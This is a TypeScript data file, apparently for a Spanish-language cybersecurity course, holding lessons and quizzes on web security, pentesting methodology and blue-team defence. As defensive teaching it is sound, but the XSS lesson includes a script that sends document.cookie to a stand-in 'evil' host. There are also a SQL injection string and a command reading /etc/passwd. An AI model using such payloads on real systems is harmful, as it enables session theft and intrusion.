import { Block, Lesson, Level, QuizQ } from "../types";

const L = (id: string, title: string, min: number, xp: number, sum: string, body: Block[], quiz: QuizQ[]): Lesson =>
  ({ id, title, min, xp, sum, body, quiz });
const Q = (q: string, opts: string[], a: number, why: string): QuizQ => ({ q, opts, a, why });

export const LEVEL4: Level = {
  id: "n4", num: 4, title: "Seguridad Web", tag: "NIVEL 4", color: "#ffb454", icon: "IGlobe", published: true,
  desc: "Cómo se rompe la web: OWASP Top 10, XSS, SQLi, CSRF, IDOR y SSRF, siempre sobre apps vulnerables del laboratorio.",
  lessons: [
    L("n4-1", "Autenticación", 10, 45, "Identidad digital: contraseñas, MFA y cómo se verifican.",
      [
        { k: "p", t: "Autenticar es verificar quién dice ser el usuario. Factores: algo que sabes (contraseña), algo que tienes (móvil, llave) y algo que eres (biometría). El MFA combina factores y reduce drásticamente el riesgo de credenciales robadas." },
        { k: "list", items: ["Las contraseñas se guardan hasheadas (bcrypt/argon2), nunca en texto plano.", "bcrypt incluye salt y es lento a propósito: frena el force brute.", "El rate limiting evita probar miles de contraseñas por minuto."] },
      ],
      [
        Q("¿Por qué bcrypt es mejor que MD5 para contraseñas?", ["Es lento y con salt: frena ataques de fuerza bruta", "Es más rápido", "Genera hashes más cortos", "Es reversible"], 0, "La lentitud controlada multiplica el coste de cada intento del atacante."),
        Q("Un segundo factor basado en el móvil aporta…", ["Algo que tienes", "Algo que sabes", "Algo que eres", "Algo que firmas"], 0, "El dispositivo físico es el factor de posesión."),
      ]),
    L("n4-2", "Sesiones", 9, 40, "El servidor no recuerda: los tokens de sesión lo hacen por él.",
      [
        { k: "p", t: "HTTP no tiene memoria. Tras el login, el servidor crea una sesión y entrega un token (ID aleatorio e impredecible) que el cliente presenta en cada petición. Si el token es predecible o no expira, el atacante puede secuestrar la sesión (session hijacking)." },
        { k: "list", items: ["IDs de sesión: aleatorios, largos, regenerados tras el login.", "Expiración e invalidación al cerrar sesión.", "Secure + HttpOnly + SameSite en la cookie que lo transporta."] },
      ],
      [
        Q("Una session ID predecible (ej. contador 1001, 1002…) permite…", ["Secuestrar sesiones de otros usuarios", "Nada: es normal", "Cifrar la sesión", "Acelerar el login"], 0, "Si puedes adivinar el ID de otra sesión, el servidor te tratará como ese usuario."),
        Q("¿Cuándo debe regenerarse el ID de sesión?", ["Tras autenticarse correctamente", "Nunca", "Cada 10 segundos", "Solo en móvil"], 0, "Evita la fijación de sesión: un ID fijado antes del login deja de ser válido."),
      ]),
    L("n4-3", "Cookies", 9, 40, "Flags de seguridad: Secure, HttpOnly y SameSite.",
      [
        { k: "p", t: "Las cookies viajan con cada petición al dominio que las creó. Sus flags deciden su seguridad: Secure (solo HTTPS), HttpOnly (inaccesible desde JavaScript: frena el robo por XSS) y SameSite (limita el envío entre sitios: frena CSRF)." },
        { k: "code", lang: "text", t: "Set-Cookie: sesion=abc123; Secure; HttpOnly; SameSite=Strict" },
        { k: "tip", t: "En el lab 'Cookie Rota' verás justo esto: una cookie sin flags que permite escalar de user a admin. La teoría cobra vida." },
      ],
      [
        Q("¿Qué flag impide que JavaScript lea la cookie?", ["HttpOnly", "Secure", "SameSite", "Path"], 0, "HttpOnly la oculta a document.cookie, bloqueando el robo vía XSS."),
        Q("SameSite=Strict protege principalmente contra…", ["CSRF", "XSS", "SQLi", "DDoS"], 0, "Impide que la cookie viaje en peticiones originadas desde otros sitios."),
      ]),
    L("n4-4", "Control de acceso", 10, 45, "Autorización: estar dentro no significa poder tocarlo todo.",
      [
        { k: "p", t: "Autenticación = quién eres; autorización = qué puedes hacer. Modelos: DAC (el dueño decide), RBAC (roles: admin, editor, lector) y ABAC (atributos). Los fallos de autorización son el nº1 del OWASP Top 10 2021: Broken Access Control." },
        { k: "list", items: ["Denegar por defecto: sin regla explícita, no hay acceso.", "Validar en el servidor: ocultar botones en el frontend no protege nada.", "Menor privilegio: cada rol, solo lo mínimo necesario."] },
      ],
      [
        Q("Ocultar el botón 'Admin' con CSS pero no validar en el servidor es…", ["Un fallo de control de acceso: la URL sigue accesible", "Seguridad suficiente", "Seguridad por ofuscación aceptada", "Un tipo de cifrado"], 0, "El atacante llama directamente a la ruta; la validación debe ser server-side."),
        Q("RBAC significa…", ["Control de acceso basado en roles", "Cifrado basado en rutas", "Backup automático", "Registro de accesos"], 0, "Los permisos se asignan a roles y los usuarios heredan los de su rol."),
      ]),
    L("n4-5", "Validación de entradas", 10, 45, "Todo input es hostil hasta que se demuestre lo contrario.",
      [
        { k: "p", t: "Cualquier dato que entra (formularios, URLs, cabeceras, JSON) puede ser malicioso. Defensa en capas: validación en cliente (UX), validación en servidor (obligatoria) y sanitización/escape según el contexto (HTML, SQL, shell, URL)." },
        { k: "list", items: ["Listas blancas > listas negras: define lo permitido, no lo prohibido.", "Tipos y rangos: edad es un entero entre 0 y 120, punto.", "Escape contextual: el mismo dato se escapa distinto en HTML que en SQL."] },
      ],
      [
        Q("¿Dónde debe validarse siempre la entrada?", ["En el servidor", "Solo en el navegador", "Solo en la base de datos", "En el CDN"], 0, "La validación del cliente se salta en segundos; la del servidor es la que protege."),
        Q("Una lista blanca (allowlist) consiste en…", ["Aceptar solo lo explícitamente permitido", "Bloquear patrones conocidos", "Cifrar la entrada", "Registrar todo input"], 0, "Es más robusta: lo no previsto se rechaza automáticamente."),
      ]),
    L("n4-6", "OWASP Top 10", 12, 50, "El mapa de riesgos que toda web debe conocer.",
      [
        { k: "p", t: "El OWASP Top 10 es la lista consensuada de los riesgos más críticos en aplicaciones web. Edición 2021: 1) Broken Access Control, 2) Fallos criptográficos, 3) Inyección, 4) Diseño inseguro, 5) Mala configuración, 6) Componentes vulnerables, 7) Fallos de identificación, 8) Fallos de integridad de software/datos, 9) Fallos de logging/monitorización, 10) SSRF." },
        { k: "tip", t: "No memorices: entiende. Cada punto del Top 10 tiene una contramedida concreta que verás en las siguientes lecciones." },
      ],
      [
        Q("Según OWASP 2021, el riesgo nº1 en aplicaciones web es…", ["Broken Access Control", "SQL Injection", "XSS", "DDoS"], 0, "Los fallos de control de acceso encabezaron la lista por su frecuencia e impacto."),
        Q("SSRF aparece en el Top 10 como…", ["Una categoría propia (A10)", "No existe en OWASP", "Parte de XSS", "Un tipo de cifrado"], 0, "Server-Side Request Forgery tiene categoría propia desde 2021."),
      ]),
    L("n4-7", "XSS (Cross-Site Scripting)", 12, 50, "JavaScript del atacante ejecutándose en el navegador de la víctima.",
      [
        { k: "p", t: "XSS ocurre cuando la app inserta input sin escapar en el HTML. Tipos: Reflejado (va en la URL y se refleja al instante), Almacenado (queda guardado y afecta a todos los que lo ven) y DOM-based (el propio JS del cliente lo construye inseguro). Impacto: robar cookies, sesiones, deface, phishing." },
        { k: "code", lang: "html", t: "<!-- entrada del usuario sin escapar -->\nComentario: <script>fetch('http://evil/?c='+document.cookie)</script>\n\n<!-- defensa: escapar entidades -->\nComentario: &lt;script&gt;…&lt;/script&gt;" },
        { k: "p", t: "Defensa: escape contextual de la salida, Content-Security-Policy restrictiva y HttpOnly en cookies. Se practica en el Nivel 5, solo contra las apps vulnerables del laboratorio." },
      ],
      [
        Q("Un comentario malicioso guardado en el blog que afecta a todos los lectores es XSS…", ["Almacenado", "Reflejado", "DOM", "De sesión"], 0, "El payload persiste en el servidor y se sirve a cada visitante."),
        Q("La cabecera que restringe qué scripts puede ejecutar la página es…", ["Content-Security-Policy", "X-Frame-Options", "Cache-Control", "Accept-Encoding"], 0, "Una CSP estricta bloquea scripts inline y dominios no autorizados."),
      ]),
    L("n4-8", "SQL Injection", 12, 50, "Cuando el input se convierte en código SQL.",
      [
        { k: "p", t: "Si la app concatena texto del usuario en la consulta, el input puede alterar su lógica. El clásico ' OR '1'='1 convierte el WHERE en siempre verdadero. Variantes: UNION (extraer otras tablas), ciega (deducir por respuestas) y por error." },
        { k: "code", lang: "sql", t: "-- código vulnerable\nquery = \"SELECT * FROM users WHERE user='\" + input + \"'\"\n-- input: admin' OR '1'='1\n-- resulta en: WHERE user='admin' OR '1'='1'  → siempre true" },
        { k: "p", t: "Defensa definitiva: consultas parametrizadas (placeholders). El input nunca se interpreta como SQL. Secundarias: menor privilegio del usuario de BD y WAF." },
      ],
      [
        Q("La defensa principal contra SQL Injection es…", ["Consultas parametrizadas", "Filtrar comillas con regex", "Usar HTTPS", "Ocultar los errores"], 0, "Con placeholders el motor trata el input siempre como dato, nunca como código."),
        Q("El payload ' OR '1'='1 busca…", ["Hacer que la condición WHERE sea siempre verdadera", "Borrar la tabla", "Cifrar la consulta", "Crear un usuario"], 0, "1=1 siempre es cierto: la consulta devuelve todo / autentica sin credenciales."),
      ]),
    L("n4-9", "CSRF", 10, 45, "La víctima ejecuta acciones sin saberlo desde otro sitio.",
      [
        { k: "p", t: "CSRF engaña al navegador de la víctima autenticada para que envíe una petición a la app (ej. transferencia bancaria) usando sus cookies. El atacante no roba la sesión: la usa en caliente. Defensa: tokens anti-CSRF únicos por formulario, SameSite en cookies y verificación de cabeceras." },
        { k: "p", t: "A diferencia del XSS, aquí el atacante no inyecta código en la app: aloja una página señuelo que dispara la petición con la sesión ya existente de la víctima." },
      ],
      [
        Q("¿Qué distingue a CSRF de XSS?", ["CSRF abusa de una sesión legítima sin inyectar código en la app", "Son lo mismo", "CSRF solo afecta APIs", "XSS no roba cookies"], 0, "CSRF no necesita ejecutar JavaScript en la app víctima: usa sus cookies desde fuera."),
        Q("Una defensa efectiva contra CSRF es…", ["Tokens anti-CSRF + cookies SameSite", "Cifrar el HTML", "Usar GET en todo", "Quitar las cookies"], 0, "El token impredecible rompe la petición falsificada; SameSite limita el envío cruzado."),
      ]),
    L("n4-10", "IDOR", 10, 45, "Cambia un número, accede a datos ajenos.",
      [
        { k: "p", t: "Insecure Direct Object Reference: la app usa identificadores directos (/facturas/1042) sin comprobar que el usuario puede verlos. Cambiar 1042 por 1043 expone la factura de otro cliente. Es el Broken Access Control más común en APIs." },
        { k: "list", items: ["Validar propiedad en el servidor: ¿este recurso pertenece a esta sesión?", "Identificadores impredecibles (UUID) dificultan la enumeración.", "Probar cambiando IDs es el primer test de toda auditoría de API."] },
      ],
      [
        Q("¿Cuál es la señal típica de un IDOR?", ["La URL contiene un ID numérico y al cambiarlo accedes a datos de otro usuario", "La web es lenta", "Falta el candado HTTPS", "Hay muchas cookies"], 0, "El acceso se autoriza por el objeto pedido, no por la sesión que lo pide."),
        Q("La corrección correcta de un IDOR es…", ["Comprobar en el servidor que la sesión es dueña del recurso", "Usar IDs más grandes", "Ocultar la URL", "Cifrar el ID solo en frontend"], 0, "La autorización debe ejecutarse server-side contra la sesión autenticada."),
      ]),
    L("n4-11", "SSRF", 10, 45, "El servidor hace peticiones donde el atacante quiere.",
      [
        { k: "p", t: "SSRF explota funciones que hacen peticiones server-side (importar URL, webhooks, previews) para que el servidor pida recursos internos: http://localhost/admin, metadata de cloud (169.254.169.254) o escanear la red interna. El servidor confía en sí mismo: el firewall no lo filtra." },
        { k: "list", items: ["Validar y limitar URLs con allowlist de dominios.", "Bloquear rangos privados y de metadata en el cliente HTTP.", "Respuestas sin rebotar: no devolver el contenido crudo al usuario."] },
      ],
      [
        Q("¿Por qué SSRF es tan peligroso en la nube?", ["Puede leer la metadata del servidor y robar credenciales temporales", "Borra la nube", "Es indetectable", "Solo afecta a Windows"], 0, "169.254.169.254 expone tokens IAM si el servidor los pide a instancias del atacante."),
        Q("Una defensa contra SSRF es…", ["Allowlist de dominios y bloqueo de rangos internos", "Permitir cualquier URL", "Quitar el HTTPS", "Usar solo GET"], 0, "Restringir destinos y rechazar IPs privadas/metadata corta el abuso."),
      ]),
    L("n4-12", "Seguridad de APIs", 12, 50, "REST/JSON bajo ataque: autenticación, límites y datos de más.",
      [
        { k: "p", t: "Las APIs modernas son el objetivo favorito: sin interfaz que 'oculte' nada, exponen endpoints que el frontend jamás llama. OWASP API Top 10 destaca: objetos expuestos de más (BOLA/IDOR), autenticación rota, exposición excesiva de datos, falta de rate limiting y SSRF." },
        { k: "list", items: ["Tokens JWT con expiración corta y firma verificada en el servidor.", "Rate limiting por token y por IP.", "Devolver solo los campos necesarios: nada de objetos internos completos.", "Versionado y logs: cada llamada, trazada."] },
        { k: "tip", t: "El lab 'La API Perdida' resume esta lección: endpoints ocultos, documentación expuesta y un IDOR esperando a ser encontrado." },
      ],
      [
        Q("BOLA, el riesgo nº1 de APIs según OWASP, es…", ["Acceso a objetos de otros usuarios sin validar propiedad", "Un tipo de cifrado", "Un ataque DDoS", "Un error de sintaxis JSON"], 0, "Broken Object Level Authorization es el IDOR aplicado a endpoints de API."),
        Q("¿Qué NO debería devolverse en una respuesta de API?", ["Campos internos como rol o hash de contraseña", "El nombre del usuario", "Un código de estado", "Un mensaje de error genérico"], 0, "La exposición excesiva de datos alimenta IDORs y filtraciones."),
      ]),
  ],
};

export const LEVEL5: Level = {
  id: "n5", num: 5, title: "Pentesting", tag: "NIVEL 5", color: "#ff7b72", icon: "IBug", published: true,
  desc: "La metodología completa: recon, enumeración, análisis, explotación ética y reporte. Solo contra objetivos del laboratorio.",
  lessons: [
    L("n5-1", "Metodología del pentest", 10, 45, "Las 5 fases que separan un pentest de un ataque caótico.",
      [
        { k: "list", items: ["1. Reconocimiento: recopilar información pública del objetivo.", "2. Enumeración: interactuar con servicios para detallarlos.", "3. Análisis de vulnerabilidades: contrastar versiones y configuraciones.", "4. Explotación: demostrar el impacto (con autorización).", "5. Reporte: hallazgos, evidencia, riesgo y remediación."] },
        { k: "p", t: "Cada lab de CyberLab replica este flujo: el reto te obliga a pasar por las fases en orden. Saltarse el recon es el error clásico del principiante." },
      ],
      [
        Q("¿Qué fase consiste en listar servicios, versiones y usuarios?", ["Enumeración", "Reporte", "Reconocimiento pasivo", "Explotación"], 0, "La enumeración interactúa con el objetivo para detallar su superficie."),
        Q("La fase más importante para el cliente es…", ["El reporte con remediaciones", "La explotación", "El recon", "La enumeración"], 0, "El valor del pentest está en el documento accionable que recibe el cliente."),
      ]),
    L("n5-2", "Reconocimiento", 12, 50, "OSINT, DNS y huella digital: todo lo que el objetivo dice de sí mismo.",
      [
        { k: "p", t: "El recon pasivo no toca el objetivo: whois, registros DNS, subdominios, repositorios públicos, ofertas de empleo (delatan tecnologías). El activo sí interactúa: escaneo de puertos, banners, directorios web. robots.txt, cabeceras HTTP y páginas de error son minas de oro." },
        { k: "code", lang: "bash", t: "scan 10.10.10.7          # puertos abiertos (en la terminal del lab)\ncurl -v http://10.10.10.7/   # cabeceras y tecnología" },
      ],
      [
        Q("¿Cuál de estas técnicas es recon PASIVO?", ["Consultar registros DNS públicos", "Escaneo de puertos", "Fuerza bruta de login", "Enviar payloads"], 0, "No genera tráfico hacia el objetivo: solo consulta fuentes externas."),
        Q("robots.txt es útil en recon porque…", ["Suele listar rutas que el sitio quiere ocultar", "Contiene contraseñas", "Da acceso root", "Cifra el tráfico"], 0, "Los paths en Disallow señalan zonas sensibles perfectas para explorar."),
      ]),
    L("n5-3", "Enumeración de servicios", 12, 50, "Versiones, banners y rutas: convertir puertos en vectores.",
      [
        { k: "p", t: "Un puerto abierto es una puerta; la versión del servicio dice si la cerradura es vieja. Enumerar = obtener banner (SSH-2.0-OpenSSH_7.2), rutas web (fuzzing de directorios), usuarios válidos (SSH, SMB) y compartir información entre hallazgos." },
        { k: "list", items: ["Puerto 8080 → suele ser desarrollo o panel interno: siempre interesante.", "Una versión antigua + CVE conocido = vector candidato.", "Documentación expuesta (/docs, /swagger) = mapa del tesoro de la API."] },
      ],
      [
        Q("Tras ver el puerto 3306 abierto, el siguiente paso lógico es…", ["Confirmar versión de MySQL y credenciales por defecto", "Explotar directamente", "Apagar el servidor", "Ignorarlo"], 0, "Versionar el servicio permite contrastarlo con vulnerabilidades conocidas."),
        Q("Un /swagger.json expuesto revela…", ["Todos los endpoints y modelos de la API", "Contraseñas en claro", "El kernel del servidor", "Nada útil"], 0, "La especificación OpenAPI documenta rutas, parámetros y esquemas completos."),
      ]),
    L("n5-4", "Explotación ética", 12, 50, "Demostrar impacto sin romper nada: el arte del pentest responsable.",
      [
        { k: "p", t: "Explotar es demostrar que el riesgo es real: leer un archivo de prueba, obtener una shell limitada, capturar la flag. Reglas: mínimo impacto (nada de rm -rf), evidencia controlada, y parar al alcanzar el objetivo del alcance. En CyberLab: capturar la flag CYBERLAB{...} es tu proof-of-concept." },
        { k: "list", items: ["Cada exploit se valida primero en el entorno del lab, nunca en producción ajena.", "Si algo 'suena' a destructivo (delete, drop, format), no se ejecuta.", "La flag es la evidencia: su valor está en el reporte, no en la captura."] },
        { k: "tip", t: "La terminal educativa solo expone comandos del entorno simulado: no puede tocar tu máquina ni sistemas externos. Así se entrena la disciplina del alcance." },
      ],
      [
        Q("¿Qué demuestra la captura de una flag en un lab?", ["Que el vector de ataque funciona: proof-of-concept", "Que eres admin del sistema", "Que el servidor es tuyo", "Nada relevante"], 0, "La flag es evidencia reproducible de la vulnerabilidad explotada."),
        Q("Durante la explotación ética, si encuentras datos reales de clientes debes…", ["Detenerte, minimizar la exposición y reportarlo", "Copiarlos como evidencia completa", "Publicarlos", "Seguir explorando"], 0, "El principio de mínimo impacto obliga a no exfiltrar más de lo necesario."),
      ]),
    L("n5-5", "Post-explotación", 10, 45, "Ya estás dentro: ¿ahora qué? Escalada, persistencia y documentación.",
      [
        { k: "p", t: "Tras el acceso inicial: orientarse (whoami, dónde estoy), buscar vectores de escalada de privilegios (SUIDs, cron jobs, credenciales en archivos), documentar todo y mantenerse dentro del alcance. En un pentest real, aquí se mide el impacto real del hallazgo." },
        { k: "code", lang: "bash", t: "whoami                    # ¿con qué privilegios entré?\ncat /etc/passwd           # usuarios del sistema\nls -la /home              # directorios personales" },
      ],
      [
        Q("El primer comando tras obtener acceso en un lab suele ser…", ["whoami / pwd: orientación", "rm -rf /", "reboot", "shutdown"], 0, "Saber quién eres y dónde estás precede a cualquier otra acción."),
        Q("Buscar archivos con bit SUID activado sirve para…", ["Encontrar vectores de escalada de privilegios", "Borrar logs", "Cifrar archivos", "Instalar servicios"], 0, "Un binario SUID mal configurado ejecuta con privilegios del dueño (a veces root)."),
      ]),
    L("n5-6", "El reporte", 10, 45, "Sin reporte no hay pentest: riesgo, evidencia y remediación.",
      [
        { k: "p", t: "El reporte traduce hallazgos técnicos a decisiones de negocio. Estructura: resumen ejecutivo (riesgo en lenguaje claro), hallazgos con severidad (Crítico/Alto/Medio/Bajo), evidencia reproducible, impacto y remediación priorizada." },
        { k: "list", items: ["Cada hallazgo: título, severidad, descripción, pasos de reproducción, impacto, remediación.", "Severidad = probabilidad × impacto, no solo lo 'cool' del exploit.", "Las soluciones de 'La base de datos oculta' en CyberLab son mini-reportes: imítalos."] },
      ],
      [
        Q("¿Qué sección del reporte lee la dirección de la empresa?", ["El resumen ejecutivo", "Los payloads exactos", "Los logs crudos", "El código del exploit"], 0, "Necesita riesgo, impacto y coste de remediar, sin jerga técnica."),
        Q("La severidad de un hallazgo depende de…", ["Probabilidad de explotación e impacto en el negocio", "Lo difícil que fue encontrarlo", "La herramienta usada", "El tamaño del reporte"], 0, "Un RCE en un servidor aislado puede ser menos severo que un IDOR en datos médicos."),
      ]),
  ],
};

export const LEVEL6: Level = {
  id: "n6", num: 6, title: "Blue Team", tag: "NIVEL 6", color: "#7fd9f6", icon: "IShield", published: true,
  desc: "Defensa activa: logs, SIEM, detección de intrusiones, respuesta a incidentes y threat hunting.",
  lessons: [
    L("n6-1", "Logs: la memoria del sistema", 10, 45, "Qué registrar, dónde vive y cómo leerlo bajo presión.",
      [
        { k: "p", t: "Los logs son la evidencia primaria de todo lo que pasa: autenticaciones, accesos, errores y cambios. En Linux viven en /var/log (auth.log, syslog, accesos web); en Windows, en el Visor de eventos. Un atacante que borra logs deja más huella que uno que no." },
        { k: "code", lang: "bash", t: "tail -n 50 /var/log/auth.log\ngrep \"Failed password\" /var/log/auth.log | tail" },
        { k: "tip", t: "En el lab 'La Base de Datos Oculta' practicarás exactamente esto: triar auth.log buscando un ataque de fuerza bruta." },
      ],
      [
        Q("¿Qué archivo de Linux registra los intentos de login SSH?", ["/var/log/auth.log", "/var/log/syslog", "/etc/passwd", "/tmp/login.log"], 0, "auth.log centraliza autenticaciones: PAM, SSH, sudo."),
        Q("¿Por qué los logs deben enviarse a un servidor central?", ["Porque el atacante con acceso local puede borrarlos", "Por velocidad", "Por estética", "No es necesario"], 0, "El forward remoto (syslog, agentes) preserva la evidencia aunque comprometan el host."),
      ]),
    L("n6-2", "SIEM", 10, 45, "Correlacionar millones de eventos para ver el ataque completo.",
      [
        { k: "p", t: "Un SIEM (Security Information and Event Management) ingesta logs de toda la infraestructura, los normaliza y correlaciona: 500 logins fallidos + un éxito + nueva cuenta creada = una intrusión que ningún log aislado revela. Ejemplos: Splunk, Elastic, Wazuh, Microsoft Sentinel." },
        { k: "list", items: ["Ingesta y normalización de fuentes heterogéneas.", "Reglas de correlación: si A y B en 5 minutos → alerta.", "Dashboards y búsqueda: hunting sobre datos históricos."] },
      ],
      [
        Q("La función central de un SIEM es…", ["Correlacionar eventos de múltiples fuentes para detectar ataques", "Cifrar discos", "Hacer backups", "Gestionar contraseñas"], 0, "Su valor está en conectar puntos que aislados parecen benignos."),
        Q("¿Cuál de estos es un SIEM?", ["Wazuh", "Nginx", "Docker", "PostgreSQL"], 0, "Wazuh es una plataforma SIEM/XDR open source."),
      ]),
    L("n6-3", "Detección de intrusiones", 10, 45, "IDS/IPS: firmas y anomalías en el tráfico y el host.",
      [
        { k: "p", t: "Un IDS detecta actividad maliciosa (Snort, Suricata, Zeek); un IPS además la bloquea. Dos enfoques: firmas (patrones conocidos: rápido, ciego ante lo nuevo) y anomalías (desviación del comportamiento basal: detecta lo desconocido, más falsos positivos)." },
        { k: "p", t: "Colocación: en el perímetro (tráfico norte-sur), entre segmentos (este-oeste) y en el host (HIDS: cambios de archivos, procesos, registros)." },
      ],
      [
        Q("La diferencia entre IDS e IPS es…", ["El IPS además de detectar, bloquea", "No hay diferencia", "El IDS es más moderno", "El IPS solo analiza logs"], 0, "IPS = IDS inline con capacidad de prevención activa."),
        Q("La detección por anomalías es útil contra…", ["Amenazas nuevas sin firma conocida", "Solo malware antiguo", "Spam", "Errores de disco"], 0, "Al modelar el comportamiento normal, lo que se desvía alerta aunque sea inédito."),
      ]),
    L("n6-4", "Análisis de eventos", 12, 50, "Triar alertas: separar lo crítico del ruido en minutos.",
      [
        { k: "p", t: "Un analista SOC tria decenas de alertas diarias. Método: contexto (¿quién, dónde, cuándo), contraste con línea base (¿es normal en este usuario?), enriquecimiento (reputación de IP, geolocalización) y veredicto: falso positivo, benigno o incidente a escalar." },
        { k: "list", items: ["Un login fallido a las 3 AM desde otro país + éxito posterior = escalar.", "El mismo fallo del mismo usuario en horario laboral = probable despiste.", "Documenta siempre el razonamiento: el siguiente turno lo agradecerá."] },
      ],
      [
        Q("Login fallido ×47 y luego éxito, a las 3:00 AM, desde un país nuevo. Veredicto…", ["Probable fuerza bruta exitosa: escalar como incidente", "Falso positivo seguro", "Actividad normal", "Error del SIEM"], 0, "El patrón completo (fallos+éxito+hora+geografía) es el clásico de credenciales comprometidas."),
        Q("¿Qué es el triage en un SOC?", ["Priorizar alertas por severidad y veracidad", "Instalar parches", "Apagar servidores", "Redactar políticas"], 0, "Clasifica y ordena la respuesta según riesgo real."),
      ]),
    L("n6-5", "Respuesta a incidentes", 12, 50, "PICERL: el playbook cuando todo sale mal.",
      [
        { k: "list", items: ["Preparación: playbooks, contactos, herramientas listas.", "Identificación: confirmar el incidente y su alcance.", "Contención: aislar hosts, cortar sesiones, bloquear IPs.", "Erradicación: eliminar malware, cerrar vectores, rotar credenciales.", "Recuperación: restaurar desde backups limpios, monitorizar.", "Lecciones aprendidas: qué falló y cómo mejorar."] },
        { k: "p", t: "El error clásico es 'limpiar' antes de preservar evidencia: sin memoria ni logs, no hay forense posible. Contener ≠ destruir." },
      ],
      [
        Q("¿Qué va PRIMERO al confirmar una intrusión?", ["Contención y preservación de evidencia", "Formatear el equipo", "Publicar en redes", "Cambiar el logo"], 0, "Aislar limita el daño; preservar evidencia permite la investigación posterior."),
        Q("PICERL son las fases de…", ["Respuesta a incidentes (NIST)", "Un ataque DDoS", "Un framework de cifrado", "Una base de datos"], 0, "Preparation, Identification, Containment, Eradication, Recovery, Lessons learned."),
      ]),
    L("n6-6", "Threat hunting", 11, 50, "Buscar al adversario que las alertas no vieron.",
      [
        { k: "p", t: "El threat hunting asume que el atacante YA está dentro y busca proactivamente: hipótesis ('un actor usaría PowerShell cifrado a las 2 AM'), datos (logs de procesos, DNS, autenticaciones) y búsqueda de anomalías (beaconing, living-off-the-land: binarios legítimos con fines ilegítimos)." },
        { k: "list", items: ["LOLBins: certutil, bitsadmin, powershell ejecutando payloads.", "Beaconing: conexiones periódicas exactas a un C2.", "DNS anómalo: subdominios largos y aleatorios (túneles/exfiltración)."] },
      ],
      [
        Q("Living-off-the-land significa…", ["Usar herramientas legítimas del sistema para fines maliciosos", "Instalar malware nuevo", "Atacar solo granjas", "Borrar el disco"], 0, "Certutil o PowerShell ya están firmados y presentes: no disparan alertas de 'binario nuevo'."),
        Q("Una conexión saliente cada 300 segundos exactos sugiere…", ["Beaconing hacia un servidor C2", "Actualizaciones de Windows", "NTP", "Streaming"], 0, "La periodicidad perfecta es huella de un implant esperando órdenes."),
      ]),
    L("n6-7", "Seguridad de endpoints", 10, 45, "EDR, hardening y el último perímetro: cada máquina.",
      [
        { k: "p", t: "Con el teletrabajo, el endpoint ES el perímetro. Capas: EDR (detección y respuesta en el equipo, evolución del antivirus), hardening (quitar lo innecesario, políticas de ejecución), parcheo continuo, cifrado de disco y control de dispositivos USB." },
        { k: "list", items: ["Principio de menor privilegio: usuarios estándar, no admins.", "Allowlisting de aplicaciones: solo corre lo aprobado.", "Cifrado de disco: el portátil robado no regala datos."] },
      ],
      [
        Q("¿Qué diferencia a un EDR de un antivirus clásico?", ["Analiza comportamiento y permite respuesta activa, no solo firmas", "Es gratuito", "No necesita actualizarse", "Solo protege servidores"], 0, "El EDR graba telemetría del endpoint, detecta comportamientos y habilita contención remota."),
        Q("El cifrado de disco (BitLocker/LUKS) protege contra…", ["La extracción de datos si roban el equipo", "Phishing", "Malware de red", "Ingeniería social"], 0, "Sin la clave, los datos del disco sustraído son ilegibles."),
      ]),
  ],
};

export const ALL_LEVELS = [LEVEL4, LEVEL5, LEVEL6];
